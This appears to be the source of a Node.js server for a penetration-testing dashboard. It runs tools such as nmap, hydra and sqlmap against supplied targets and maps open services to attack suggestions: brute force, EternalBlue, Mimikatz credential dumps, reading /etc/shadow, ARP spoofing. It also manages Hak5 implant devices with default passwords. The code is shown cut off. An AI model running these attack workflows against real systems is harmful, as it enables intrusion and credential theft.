const express = require('express');
const cors = require('cors');
const path = require('path');
const { spawn, exec, execSync } = require('child_process');
const net = require('net');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '5mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ══════════════════════════════════════════════════════════════
// ── TOOL REGISTRY & SCAN PRESETS ──
// ══════════════════════════════════════════════════════════════

const ARSENAL_TOOLS = [
  { id: 'nmap', name: 'Nmap', bin: 'nmap', category: 'scanner', desc: 'Network mapper / port scanner' },
  { id: 'masscan', name: 'Masscan', bin: 'masscan', category: 'scanner', desc: 'Mass IP port scanner (async)' },
  { id: 'nikto', name: 'Nikto', bin: 'nikto', category: 'web', desc: 'Web server vulnerability scanner' },
  { id: 'gobuster', name: 'Gobuster', bin: 'gobuster', category: 'web', desc: 'Directory/file brute-forcer' },
  { id: 'sqlmap', name: 'SQLMap', bin: 'sqlmap', category: 'web', desc: 'SQL injection detection & exploitation' },
  { id: 'hydra', name: 'Hydra', bin: 'hydra', category: 'bruteforce', desc: 'Login brute-forcer (SSH, FTP, HTTP, etc.)' },
  { id: 'enum4linux', name: 'Enum4Linux', bin: 'enum4linux', category: 'enum', desc: 'SMB/NetBIOS enumeration' },
  { id: 'smbclient', name: 'SMBClient', bin: 'smbclient', category: 'enum', desc: 'SMB share access' },
  { id: 'dig', name: 'Dig', bin: 'dig', category: 'dns', desc: 'DNS lookup / zone transfer' },
  { id: 'whatweb', name: 'WhatWeb', bin: 'whatweb', category: 'web', desc: 'Web technology fingerprinting' },
  { id: 'sslscan', name: 'SSLScan', bin: 'sslscan', category: 'crypto', desc: 'SSL/TLS cipher & cert analysis' },
  { id: 'wpscan', name: 'WPScan', bin: 'wpscan', category: 'web', desc: 'WordPress vulnerability scanner' },
];

const SCAN_PRESETS = [
  { id: 'quick-sv', name: 'Quick SV', tool: 'nmap', args: '-sV -sC -T4 --open -Pn {TARGET}', desc: 'Service version + scripts, åbne porte', profile: 'default' },
  { id: 'stealth', name: 'Stealth', tool: 'nmap', args: '-sS -T2 -f --data-length 24 -Pn {TARGET}', desc: 'SYN scan, langsom timing, fragmenteret', profile: 'stealth' },
  { id: 'aggressive', name: 'Aggressive', tool: 'nmap', args: '-A -T4 -p- --open -Pn {TARGET}', desc: 'Alle porte, OS detect, traceroute, scripts', profile: 'aggressive' },
  { id: 'web-app', name: 'Web App', tool: 'nmap', args: '-sV -p 80,443,8080,8443,3000,8000,9090 --script=http-title,http-headers,http-methods -Pn {TARGET}', desc: 'Web-porte + HTTP scripts', profile: 'web' },
  { id: 'iot', name: 'IoT', tool: 'nmap', args: '-sV -p 80,443,1883,5683,8883,5353,49152 --open -Pn {TARGET}', desc: 'MQTT, CoAP, UPnP, mDNS', profile: 'iot' },
  { id: 'smb-enum', name: 'SMB Enum', tool: 'nmap', args: '-sV -p 139,445 --script=smb-enum-shares,smb-os-discovery,smb-vuln* -Pn {TARGET}', desc: 'SMB deling + vuln check', profile: 'enum' },
  { id: 'full-masscan', name: 'Masscan Full', tool: 'masscan', args: '-p0-65535 --rate=1000 {TARGET}', desc: 'Alle TCP porte, hurtig', profile: 'aggressive' },
  { id: 'vuln-scan', name: 'Vuln Scan', tool: 'nmap', args: '-sV --script=vulners,vulscan -Pn {TARGET}', desc: 'Service detect + CVE lookup via scripts', profile: 'default' },
];

// ══════════════════════════════════════════════════════════════
// ── SEVERITY & ATTACK TEMPLATES ──
// ══════════════════════════════════════════════════════════════

const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

// Device types that can be suggested per attack
const DEVICE_TYPES = {
  usb_ducky:   { id: 'usb_ducky',   icon: '🦆', name: 'USB Rubber Ducky', method: 'keystroke-injection' },
  bash_bunny:  { id: 'bash_bunny',  icon: '🐰', name: 'Bash Bunny', method: 'multi-vector' },
  omg_cable:   { id: 'omg_cable',   icon: '🔌', name: 'O.MG Cable', method: 'covert-hid' },
  key_croc:    { id: 'key_croc',    icon: '🐊', name: 'Key Croc', method: 'keylogger' },
  wifi_pine:   { id: 'wifi_pine',   icon: '🍍', name: 'WiFi Pineapple', method: 'wireless' },
  lan_turtle:  { id: 'lan_turtle',  icon: '🐢', name: 'LAN Turtle', method: 'network-implant' },
  packet_sq:   { id: 'packet_sq',   icon: '🦑', name: 'Packet Squirrel', method: 'network-tap' },
};

// Enhanced attack templates with device types, confidence, tool mapping, and OS attacks
const attackTemplates = [
  // SSH
  { match: p => p.service.match(/ssh/i), name: 'SSH Brute Force', severity: 'high', module: 'ssh_bruteforce', description: 'Attempt SSH login with common credentials', tool: 'hydra', toolArgs: '-l root -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}:{PORT}', devices: ['bash_bunny','usb_ducky'], confidence: p => p.version ? 0.9 : 0.7 },
  { match: p => p.service.match(/ssh/i), name: 'SSH Key Enumeration', severity: 'medium', module: 'ssh_enum', description: 'Enumerate SSH host keys and algorithms', tool: 'nmap', toolArgs: '--script ssh-hostkey,ssh-auth-methods -p {PORT} {TARGET}', devices: [], confidence: () => 0.95 },
  // HTTP/HTTPS
  { match: p => p.service.match(/http/i) && !p.service.match(/https/i), name: 'SQL Injection Scan', severity: 'critical', module: 'sqli_scan', description: 'Detect SQL injection points in web parameters', tool: 'sqlmap', toolArgs: '-u http://{TARGET}:{PORT}/ --batch --crawl=2', devices: ['bash_bunny'], confidence: () => 0.6 },
  { match: p => p.service.match(/http/i), name: 'XSS Detection', severity: 'high', module: 'xss_detect', description: 'Scan for reflected and stored XSS vulnerabilities', tool: 'nmap', toolArgs: '--script http-stored-xss,http-dombased-xss -p {PORT} {TARGET}', devices: ['omg_cable','usb_ducky'], confidence: () => 0.5 },
  { match: p => p.service.match(/http/i), name: 'Directory Bruteforce', severity: 'medium', module: 'dir_bruteforce', description: 'Discover hidden directories and files', tool: 'gobuster', toolArgs: 'dir -u http://{TARGET}:{PORT} -w /usr/share/wordlists/dirb/common.txt', devices: [], confidence: () => 0.85 },
  { match: p => p.service.match(/http/i), name: 'CORS Misconfiguration', severity: 'medium', module: 'cors_misconfig', description: 'Detect overly permissive CORS policies', tool: 'nmap', toolArgs: '--script http-cors -p {PORT} {TARGET}', devices: [], confidence: () => 0.7 },
  { match: p => p.service.match(/http/i), name: 'Command Injection', severity: 'critical', module: 'cmd_injection', description: 'Test for OS command injection vulnerabilities', tool: 'nmap', toolArgs: '--script http-shellshock -p {PORT} {TARGET}', devices: ['bash_bunny','omg_cable'], confidence: () => 0.4 },
  { match: p => p.service.match(/http/i), name: 'SSRF Detection', severity: 'high', module: 'ssrf_detect', description: 'Test for server-side request forgery', tool: null, toolArgs: '', devices: ['bash_bunny'], confidence: () => 0.35 },
  { match: p => p.service.match(/http/i), name: 'File Upload Bypass', severity: 'high', module: 'upload_bypass', description: 'Test file upload restrictions for bypass', tool: null, toolArgs: '', devices: ['bash_bunny'], confidence: () => 0.3 },
  { match: p => p.service.match(/http/i), name: 'Web Tech Fingerprint', severity: 'info', module: 'web_fingerprint', description: 'Identify web technologies, frameworks, CMS', tool: 'whatweb', toolArgs: 'http://{TARGET}:{PORT} -a 3', devices: [], confidence: () => 0.95 },
  { match: p => p.service.match(/http/i) && !p.service.match(/https/i), name: 'HTTP Verb Tampering', severity: 'low', module: 'http_verbtamper', description: 'Test for HTTP verb tampering vulnerabilities', tool: 'nmap', toolArgs: '--script http-methods -p {PORT} {TARGET}', devices: [], confidence: () => 0.8 },
  // SSL/TLS
  { match: p => p.service.match(/ssl|https|tls/i) || p.port === 443, name: 'SSL/TLS Weakness', severity: 'medium', module: 'ssl_audit', description: 'Check for weak ciphers and protocol versions', tool: 'sslscan', toolArgs: '{TARGET}:{PORT}', devices: [], confidence: () => 0.9 },
  { match: p => p.service.match(/ssl|https|tls/i) || p.port === 443, name: 'Certificate Validation', severity: 'low', module: 'cert_validate', description: 'Verify certificate chain and expiry', tool: 'nmap', toolArgs: '--script ssl-cert -p {PORT} {TARGET}', devices: [], confidence: () => 0.95 },
  // MySQL
  { match: p => p.service.match(/mysql/i), name: 'MySQL Auth Bypass', severity: 'critical', module: 'mysql_authbypass', description: 'Test for MySQL authentication bypass (CVE-2012-2122)', tool: 'nmap', toolArgs: '--script mysql-vuln-cve2012-2122 -p {PORT} {TARGET}', devices: ['bash_bunny','lan_turtle'], confidence: p => p.version && p.version.match(/5\.[0-5]/) ? 0.8 : 0.3 },
  { match: p => p.service.match(/mysql/i), name: 'MySQL Default Creds', severity: 'high', module: 'mysql_defaultcreds', description: 'Test MySQL with default credentials', tool: 'hydra', toolArgs: '-l root -P /usr/share/wordlists/rockyou.txt mysql://{TARGET}:{PORT}', devices: ['bash_bunny','lan_turtle'], confidence: () => 0.6 },
  // PostgreSQL
  { match: p => p.service.match(/postgres/i), name: 'PostgreSQL Default Creds', severity: 'high', module: 'pg_defaultcreds', description: 'Test PostgreSQL with default credentials', tool: 'hydra', toolArgs: '-l postgres -P /usr/share/wordlists/rockyou.txt postgres://{TARGET}:{PORT}', devices: ['lan_turtle'], confidence: () => 0.6 },
  // FTP
  { match: p => p.service.match(/ftp/i), name: 'FTP Anonymous Login', severity: 'high', module: 'ftp_anon', description: 'Test for anonymous FTP access', tool: 'nmap', toolArgs: '--script ftp-anon -p {PORT} {TARGET}', devices: ['bash_bunny'], confidence: () => 0.85 },
  { match: p => p.service.match(/ftp/i), name: 'FTP Brute Force', severity: 'medium', module: 'ftp_bruteforce', description: 'Attempt FTP login with common credentials', tool: 'hydra', toolArgs: '-l admin -P /usr/share/wordlists/rockyou.txt ftp://{TARGET}:{PORT}', devices: ['bash_bunny'], confidence: () => 0.5 },
  // SMTP
  { match: p => p.service.match(/smtp/i), name: 'SMTP Open Relay', severity: 'critical', module: 'smtp_relay', description: 'Test for open mail relay', tool: 'nmap', toolArgs: '--script smtp-open-relay -p {PORT} {TARGET}', devices: [], confidence: () => 0.7 },
  { match: p => p.service.match(/smtp/i), name: 'SMTP User Enumeration', severity: 'medium', module: 'smtp_enum', description: 'Enumerate valid email addresses via VRFY/EXPN', tool: 'nmap', toolArgs: '--script smtp-enum-users -p {PORT} {TARGET}', devices: [], confidence: () => 0.75 },
  // DNS
  { match: p => p.service.match(/dns|domain/i), name: 'DNS Zone Transfer', severity: 'high', module: 'dns_axfr', description: 'Attempt DNS zone transfer (AXFR)', tool: 'dig', toolArgs: 'axfr @{TARGET}', devices: [], confidence: () => 0.6 },
  // Redis
  { match: p => p.service.match(/redis/i), name: 'Redis Unauth Access', severity: 'critical', module: 'redis_noauth', description: 'Test for unauthenticated Redis access', tool: 'nmap', toolArgs: '--script redis-info -p {PORT} {TARGET}', devices: ['lan_turtle','packet_sq'], confidence: () => 0.85 },
  // VNC
  { match: p => p.service.match(/vnc/i), name: 'VNC Auth Bypass', severity: 'critical', module: 'vnc_authbypass', description: 'Test for VNC authentication bypass', tool: 'nmap', toolArgs: '--script vnc-brute -p {PORT} {TARGET}', devices: ['bash_bunny'], confidence: () => 0.5 },
  // Telnet
  { match: p => p.service.match(/telnet/i), name: 'Telnet Default Creds', severity: 'high', module: 'telnet_creds', description: 'Test Telnet with default credentials', tool: 'hydra', toolArgs: '-l admin -P /usr/share/wordlists/rockyou.txt telnet://{TARGET}:{PORT}', devices: ['bash_bunny','lan_turtle'], confidence: () => 0.7 },
  // SMB
  { match: p => p.service.match(/smb|microsoft-ds|netbios/i), name: 'SMB EternalBlue', severity: 'critical', module: 'smb_eternalblue', description: 'Test for MS17-010 EternalBlue vulnerability', tool: 'nmap', toolArgs: '--script smb-vuln-ms17-010 -p {PORT} {TARGET}', devices: ['lan_turtle','packet_sq'], confidence: p => p.version && p.version.match(/Windows/i) ? 0.7 : 0.3 },
  { match: p => p.service.match(/smb|microsoft-ds|netbios/i), name: 'SMB Share Enum', severity: 'medium', module: 'smb_shares', description: 'Enumerate accessible SMB shares', tool: 'enum4linux', toolArgs: '-S {TARGET}', devices: ['lan_turtle'], confidence: () => 0.85 },
  // RDP
  { match: p => p.service.match(/rdp|ms-wbt/i), name: 'RDP BlueKeep', severity: 'critical', module: 'rdp_bluekeep', description: 'Test for CVE-2019-0708 BlueKeep vulnerability', tool: 'nmap', toolArgs: '--script rdp-vuln-ms12-020 -p {PORT} {TARGET}', devices: ['bash_bunny'], confidence: p => p.version && p.version.match(/Windows/i) ? 0.6 : 0.2 },
];

// OS-based attack suggestions (added when OS is detected)
const osAttackTemplates = [
  { match: os => os.match(/windows/i), name: 'Windows Credential Dump', severity: 'critical', module: 'win_creds', description: 'Dump SAM/LSASS credentials via Mimikatz', devices: ['usb_ducky','bash_bunny','omg_cable'], confidence: 0.7 },
  { match: os => os.match(/windows/i), name: 'Windows UAC Bypass', severity: 'high', module: 'win_uac', description: 'Attempt UAC bypass for privilege escalation', devices: ['usb_ducky','bash_bunny'], confidence: 0.5 },
  { match: os => os.match(/windows/i), name: 'Windows WiFi Dump', severity: 'high', module: 'win_wifi', description: 'Extract saved WiFi credentials', devices: ['usb_ducky','bash_bunny','omg_cable'], confidence: 0.85 },
  { match: os => os.match(/linux/i), name: 'Linux Priv Escalation Check', severity: 'high', module: 'lin_privesc', description: 'Check for SUID/sudo/kernel privilege escalation vectors', devices: ['bash_bunny','key_croc'], confidence: 0.6 },
  { match: os => os.match(/linux/i), name: 'Linux Credential Harvest', severity: 'high', module: 'lin_creds', description: 'Extract SSH keys, .bash_history, /etc/shadow (if readable)', devices: ['bash_bunny','key_croc'], confidence: 0.5 },
];

// Network-wide attack suggestions
const networkAttackTemplates = [
  { name: 'ARP Spoofing / MITM', severity: 'critical', module: 'arp_spoof', description: 'ARP cache poisoning for man-in-the-middle', devices: ['lan_turtle','packet_sq','wifi_pine'], confidence: 0.8 },
  { name: 'DNS Spoofing', severity: 'high', module: 'dns_spoof', description: 'Redirect DNS queries to malicious servers', devices: ['lan_turtle','wifi_pine'], confidence: 0.6 },
  { name: 'LLMNR/NBT-NS Poisoning', severity: 'high', module: 'llmnr_poison', description: 'Capture NTLMv2 hashes via name resolution poisoning', devices: ['lan_turtle','packet_sq'], confidence: 0.75 },
  { name: 'Evil Twin AP', severity: 'critical', module: 'evil_twin', description: 'Create rogue access point to intercept wireless traffic', devices: ['wifi_pine'], confidence: 0.7 },
  { name: 'Deauth Attack', severity: 'medium', module: 'wifi_deauth', description: 'Force wireless clients to disconnect and reconnect', devices: ['wifi_pine'], confidence: 0.9 },
];

// ══════════════════════════════════════════════════════════════
// ── JOB EXECUTION SYSTEM ──
// ══════════════════════════════════════════════════════════════

const jobStore = {};
const scanHistory = {};  // key: target IP → array of scan results

function validateTarget(target) {
  return /^[a-zA-Z0-9._:/-]+$/.test(target);
}

function genId() {
  return crypto.randomBytes(6).toString('hex');
}

// Check which tools are installed
function checkInstalled(toolId) {
  const tool = ARSENAL_TOOLS.find(t => t.id === toolId);
  if (!tool) return false;
  try {
    execSync(`which ${tool.bin} 2>/dev/null`, { encoding: 'utf-8' });
    return true;
  } catch { return false; }
}

// GET /api/arsenal/tools — list available tools + install status
app.get('/api/arsenal/tools', (req, res) => {
  const tools = ARSENAL_TOOLS.map(t => ({
    ...t,
    installed: checkInstalled(t.id),
  }));
  res.json({ tools });
});

// GET /api/arsenal/presets — list scan presets
app.get('/api/arsenal/presets', (req, res) => {
  res.json({ presets: SCAN_PRESETS });
});

// POST /api/arsenal/run — execute a tool as a background job
app.post('/api/arsenal/run', (req, res) => {
  const { tool, args, target, preset } = req.body;

  if (!target || !validateTarget(target)) {
    return res.status(400).json({ error: 'Invalid or missing target' });
  }

  let finalTool = tool;
  let finalArgs = args || '';

  // If preset is given, resolve it
  if (preset) {
    const p = SCAN_PRESETS.find(s => s.id === preset);
    if (!p) return res.status(400).json({ error: 'Unknown preset: ' + preset });
    finalTool = p.tool;
    finalArgs = p.args.replace(/\{TARGET\}/g, target);
  } else {
    finalArgs = finalArgs.replace(/\{TARGET\}/g, target);
  }

  const toolDef = ARSENAL_TOOLS.find(t => t.id === finalTool);
  if (!toolDef) return res.status(400).json({ error: 'Unknown tool: ' + finalTool });

  const jobId = 'JOB-' + genId();
  const job = {
    id: jobId,
    tool: finalTool,
    toolBin: toolDef.bin,
    args: finalArgs,
    target,
    preset: preset || null,
    status: 'running',
    output: '',
    startedAt: new Date().toISOString(),
    finishedAt: null,
    exitCode: null,
    pid: null,
  };
  jobStore[jobId] = job;

  // Spawn child process
  const parts = finalArgs.split(/\s+/);
  const child = spawn(toolDef.bin, parts, {
    timeout: 300000, // 5 min max
    env: { ...process.env },
  });
  job.pid = child.pid;

  child.stdout.on('data', d => { job.output += d.toString(); });
  child.stderr.on('data', d => { job.output += d.toString(); });
  child.on('close', code => {
    job.status = 'done';
    job.exitCode = code;
    job.finishedAt = new Date().toISOString();
  });
  child.on('error', err => {
    job.status = 'error';
    job.output += '\n[ERROR] ' + err.message;
    job.finishedAt = new Date().toISOString();
  });

  res.json({ job_id: jobId, status: 'running', tool: finalTool, target });
});

// GET /api/arsenal/status/:id — poll job status + output
app.get('/api/arsenal/status/:id', (req, res) => {
  const job = jobStore[req.params.id];
  if (!job) return res.status(404).json({ error: 'Job not found' });
  res.json({
    id: job.id,
    tool: job.tool,
    target: job.target,
    preset: job.preset,
    status: job.status,
    output: job.output,
    startedAt: job.startedAt,
    finishedAt: job.finishedAt,
    exitCode: job.exitCode,
    outputLength: job.output.length,
  });
});

// POST /api/arsenal/kill/:id — kill a running job
app.post('/api/arsenal/kill/:id', (req, res) => {
  const job = jobStore[req.params.id];
  if (!job) return res.status(404).json({ error: 'Job not found' });
  if (job.status !== 'running') return res.json({ ok: true, message: 'Job already finished' });
  try {
    process.kill(job.pid, 'SIGTERM');
    job.status = 'killed';
    job.finishedAt = new Date().toISOString();
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ══════════════════════════════════════════════════════════════
// ── ENHANCED ANALYZE ENDPOINT ──
// ══════════════════════════════════════════════════════════════

// Well-known port-to-service mapping for TCP fallback
const portServiceMap = {
  21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'domain',
  80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 445: 'microsoft-ds',
  993: 'imaps', 995: 'pop3s', 1433: 'ms-sql', 2049: 'nfs',
  3000: 'http', 3306: 'mysql', 3389: 'ms-wbt-server',
  5432: 'postgresql', 5900: 'vnc', 6379: 'redis', 8000: 'http',
  8080: 'http-proxy', 8443: 'https-alt', 8888: 'http', 9090: 'http',
  9200: 'elasticsearch', 11211: 'memcached', 27017: 'mongodb',
};

function parseNmapOutput(output) {
  const hosts = [];
  const lines = output.split('\n');
  let currentHost = null;
  for (const line of lines) {
    const hostMatch = line.match(/Nmap scan report for\s+(?:(\S+)\s+\()?(\d+\.\d+\.\d+\.\d+)\)?/);
    if (hostMatch) {
      if (currentHost) hosts.push(currentHost);
      currentHost = { ip: hostMatch[2], hostname: hostMatch[1] || hostMatch[2], os: '', ports: [] };
      continue;
    }
    const osMatch = line.match(/OS details?:\s*(.+)/i) || line.match(/Running:\s*(.+)/i);
    if (osMatch && currentHost) { currentHost.os = osMatch[1].trim(); continue; }
    const portMatch = line.match(/^(\d+)\/(tcp|udp)\s+(open)\s+(\S+)\s*(.*)/);
    if (portMatch && currentHost) {
      currentHost.ports.push({
        port: parseInt(portMatch[1]), protocol: portMatch[2], state: portMatch[3],
        service: portMatch[4], version: portMatch[5] ? portMatch[5].trim() : '',
      });
    }
  }
  if (currentHost) hosts.push(currentHost);
  return hosts;
}

function tcpScan(host, ports, timeout) {
  return Promise.all(ports.map(port => new Promise(resolve => {
    const sock = new net.Socket();
    sock.setTimeout(timeout);
    sock.once('connect', () => { sock.destroy(); resolve({ port, open: true }); });
    sock.once('timeout', () => { sock.destroy(); resolve({ port, open: false }); });
    sock.once('error',   () => { sock.destroy(); resolve({ port, open: false }); });
    sock.connect(port, host);
  })));
}

function generateAttacks(hosts) {
  const attacks = [];
  const seen = new Set();
  for (const host of hosts) {
    for (const port of host.ports) {
      for (const tpl of attackTemplates) {
        if (tpl.match(port)) {
          const key = `${host.ip}:${tpl.name}`;
          if (seen.has(key)) continue;
          seen.add(key);
          const conf = typeof tpl.confidence === 'function' ? tpl.confidence(port) : 0.5;
          attacks.push({
            name: tpl.name, severity: tpl.severity, port: port.port,
            protocol: port.protocol, service: port.service, version: port.version,
            module: tpl.module, description: tpl.description, host: host.ip,
            confidence: Math.round(conf * 100),
            tool: tpl.tool, toolArgs: (tpl.toolArgs || '').replace(/\{TARGET\}/g, host.ip).replace(/\{PORT\}/g, port.port),
            toolInstalled: tpl.tool ? checkInstalled(tpl.tool) : false,
            devices: (tpl.devices || []).map(d => DEVICE_TYPES[d]).filter(Boolean),
          });
        }
      }
    }
  }
  attacks.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);
  attacks.forEach((atk, i) => { atk.id = i + 1; });
  return attacks;
}

function generateOsAttacks(hosts) {
  const osAttacks = [];
  for (const host of hosts) {
    if (!host.os) continue;
    for (const tpl of osAttackTemplates) {
      if (tpl.match(host.os)) {
        osAttacks.push({
          name: tpl.name, severity: tpl.severity, module: tpl.module,
          description: tpl.description, host: host.ip, os: host.os,
          confidence: Math.round(tpl.confidence * 100),
          devices: (tpl.devices || []).map(d => DEVICE_TYPES[d]).filter(Boolean),
        });
      }
    }
  }
  return osAttacks;
}

function generateNetworkAttacks(hosts) {
  if (hosts.length === 0) return [];
  return networkAttackTemplates.map(tpl => ({
    name: tpl.name, severity: tpl.severity, module: tpl.module,
    description: tpl.description, confidence: Math.round(tpl.confidence * 100),
    devices: (tpl.devices || []).map(d => DEVICE_TYPES[d]).filter(Boolean),
    scope: 'network',
  }));
}

// POST /api/arsenal/analyze — analyze scan output or run fresh scan
app.post('/api/arsenal/analyze', async (req, res) => {
  const { target, job_id } = req.body;
  let nmapOutput = '';
  let scanMethod = 'nmap';
  let hosts = [];

  // If job_id is provided, use that job's output
  if (job_id && jobStore[job_id]) {
    const job = jobStore[job_id];
    if (job.status !== 'done') return res.status(400).json({ error: 'Job not finished yet' });
    nmapOutput = job.output;
    scanMethod = job.tool;
    hosts = parseNmapOutput(nmapOutput);
  } else if (target) {
    if (!validateTarget(target)) return res.status(400).json({ error: 'Invalid target format' });

    try {
      nmapOutput = execSync(`nmap -sV -T4 --open -Pn ${target}`, { timeout: 120000, encoding: 'utf-8' });
    } catch (err) {
      nmapOutput = err.stdout || err.stderr || '';
    }
    hosts = parseNmapOutput(nmapOutput);

    if (hosts.length === 0 || hosts.every(h => h.ports.length === 0)) {
      scanMethod = 'tcp-connect';
      const scanPorts = Object.keys(portServiceMap).map(Number);
      try {
        const results = await tcpScan(target, scanPorts, 3000);
        const openPorts = results.filter(r => r.open);
        if (openPorts.length > 0) {
          hosts = [{ ip: target, hostname: target, os: 'Unknown',
            ports: openPorts.map(r => ({ port: r.port, protocol: 'tcp', state: 'open', service: portServiceMap[r.port] || 'unknown', version: '' })),
          }];
        }
      } catch (err) { /* TCP scan failed */ }
    }
  } else {
    return res.status(400).json({ error: 'Provide target or job_id' });
  }

  if (hosts.length === 0) {
    return res.json({
      hosts: [], attacks: [], osAttacks: [], networkAttacks: [],
      summary: { totalHosts: 0, totalAttacks: 0, critical: 0, high: 0, medium: 0, low: 0, info: 0 },
      scanMethod, nmapRaw: nmapOutput,
      error: 'No open ports found. Target may be unreachable from this network.',
    });
  }

  const attacks = generateAttacks(hosts);
  const osAttacks = generateOsAttacks(hosts);
  const networkAttacks = generateNetworkAttacks(hosts);

  const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const a of [...attacks, ...osAttacks, ...networkAttacks]) counts[a.severity] = (counts[a.severity] || 0) + 1;

  const allDeviceIds = new Set();
  [...attacks, ...osAttacks, ...networkAttacks].forEach(a => (a.devices || []).forEach(d => allDeviceIds.add(d.id)));

  const result = {
    hosts: hosts.map(h => ({
      ip: h.ip, hostname: h.hostname, os: h.os || 'Unknown',
      ports: h.ports.map(p => ({ port: p.port, protocol: p.protocol, state: p.state, service: p.service, version: p.version })),
    })),
    attacks,
    osAttacks,
    networkAttacks,
    summary: {
      totalHosts: hosts.length,
      totalAttacks: attacks.length + osAttacks.length + networkAttacks.length,
      ...counts,
      deviceTypes: Array.from(allDeviceIds),
    },
    scanMethod,
    nmapRaw: nmapOutput,
  };

  // Save to scan history
  const histTarget = hosts[0] ? hosts[0].ip : (target || 'unknown');
  if (!scanHistory[histTarget]) scanHistory[histTarget] = [];
  scanHistory[histTarget].push({ timestamp: new Date().toISOString(), summary: result.summary, scanMethod });

  res.json(result);
});

// GET /api/arsenal/history/:target — scan history for a target
app.get('/api/arsenal/history/:target', (req, res) => {
  res.json({ history: scanHistory[req.params.target] || [] });
});

// ══════════════════════════════════════════════════════════════
// ── DEVICE MANAGEMENT & PAYLOAD PUSH SYSTEM ──
// ══════════════════════════════════════════════════════════════

// Audit log
const auditLog = [];
function audit(event, data) {
  auditLog.push({ event, ...data, timestamp: new Date().toISOString() });
}

// Device-specific payload paths
const DEVICE_PAYLOAD_PATHS = {
  'bash-bunny':    { path: '/root/payloads/switch1/payload.txt', format: 'duckyscript', compile: false },
  'rubber-ducky':  { path: '/inject.bin', format: 'duckyscript', compile: true, compiler: 'java -jar duckencoder.jar -i {INPUT} -o {OUTPUT}' },
  'omg-cable':     { path: '/payload.txt', format: 'duckyscript', compile: false, push_method: 'wifi-ota' },
  'key-croc':      { path: '/root/payloads/payload.txt', format: 'bash+duckyscript', compile: false },
  'wifi-pineapple':{ path: '/root/payload.sh', format: 'bash', compile: false },
  'lan-turtle':    { path: '/root/payload.sh', format: 'bash', compile: false },
  'packet-squirrel':{ path: '/root/payload.sh', format: 'bash', compile: false },
};

// In-memory device registry (simulates devices table)
let deviceIdSeq = 1;
const deviceStore = {};

// Seed devices
const SEED_DEVICES = [
  { name: 'BB-Alpha', type: 'bash-bunny', api_key: 'dk_bb_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.10', engagement_id: 'ENG-001', firmware: 'v1.7', status: 'online' },
  { name: 'BB-Bravo', type: 'bash-bunny', api_key: 'dk_bb_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.11', engagement_id: 'ENG-001', firmware: 'v1.7', status: 'offline' },
  { name: 'Ducky-01', type: 'rubber-ducky', api_key: 'dk_rd_' + crypto.randomBytes(16).toString('hex'), wg_ip: null, engagement_id: 'ENG-001', firmware: 'v3.0', status: 'offline' },
  { name: 'OMG-Stealth', type: 'omg-cable', api_key: 'dk_omg_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.20', engagement_id: 'ENG-002', firmware: 'v2.5', status: 'online' },
  { name: 'KC-Inline', type: 'key-croc', api_key: 'dk_kc_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.21', engagement_id: 'ENG-002', firmware: 'v1.4', status: 'offline' },
  { name: 'Pine-Mark7', type: 'wifi-pineapple', api_key: 'dk_wp_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.30', engagement_id: 'ENG-002', firmware: 'v2.1', status: 'online' },
  { name: 'LT-Office', type: 'lan-turtle', api_key: 'dk_lt_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.31', engagement_id: 'ENG-003', firmware: 'v3.0', status: 'online' },
  { name: 'PktSq-NetTap', type: 'packet-squirrel', api_key: 'dk_ps_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.32', engagement_id: 'ENG-003', firmware: 'v1.2', status: 'offline' },
  // PC-Agents (for agent-mediated device injection)
  { name: 'DESKTOP-OPS01', type: 'pc-agent', api_key: 'dk_pc_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.100', engagement_id: 'ENG-001', firmware: 'PS-Agent v1.0', status: 'offline' },
  { name: 'LAPTOP-FIELD02', type: 'pc-agent', api_key: 'dk_pc_' + crypto.randomBytes(16).toString('hex'), wg_ip: '10.13.37.101', engagement_id: 'ENG-002', firmware: 'PS-Agent v1.0', status: 'offline' },
];
SEED_DEVICES.forEach(d => {
  const id = deviceIdSeq++;
  deviceStore[id] = { id, ...d, last_heartbeat: null, hostname: null, ip: null };
});

// In-memory payload store (simulates device_payloads table)
let payloadIdSeq = 1;
const payloadStore = {};

// ── INJECT JOB SYSTEM (Automated Device Injection) ──
let injectJobIdSeq = 1;
const injectJobStore = {};
const agentConnectedDevices = {}; // agentDeviceId → { devices: [...], lastSeen }

// Push strategies per device type (VPN-first, agent-fallback)
const PUSH_STRATEGIES = {
  'bash-bunny': [
    { method: 'ssh', desc: 'SSH via VPN', check: d => d.wg_ip && d.status === 'online',
      payloadPath: '/root/udisk/payloads/switch1/payload.txt', creds: { user: 'root', pass: 'hak5bunny' } },
    { method: 'agent', desc: 'Via PC-agent', payloadPath: '\\payloads\\switch1\\payload.txt' },
    { method: 'ssh', desc: 'RNDIS (172.16.64.1)', directIp: '172.16.64.1', check: () => false,
      payloadPath: '/root/udisk/payloads/switch1/payload.txt', creds: { user: 'root', pass: 'hak5bunny' } },
  ],
  'rubber-ducky': [
    { method: 'agent', desc: 'Via PC-agent (SD)', payloadPath: '\\inject.bin' },
  ],
  'omg-cable': [
    { method: 'http', desc: 'HTTP API via VPN', check: d => d.wg_ip && d.status === 'online',
      apiPort: 80, apiPath: '/api/payload' },
    { method: 'agent', desc: 'Via PC-agent', payloadPath: '\\payload.txt' },
  ],
  'key-croc': [
    { method: 'ssh', desc: 'SSH via VPN', check: d => d.wg_ip && d.status === 'online',
      payloadPath: '/root/payloads/payload.txt', creds: { user: 'root', pass: 'hak5croc' } },
    { method: 'agent', desc: 'Via PC-agent', payloadPath: '\\payload\\payload.txt' },
  ],
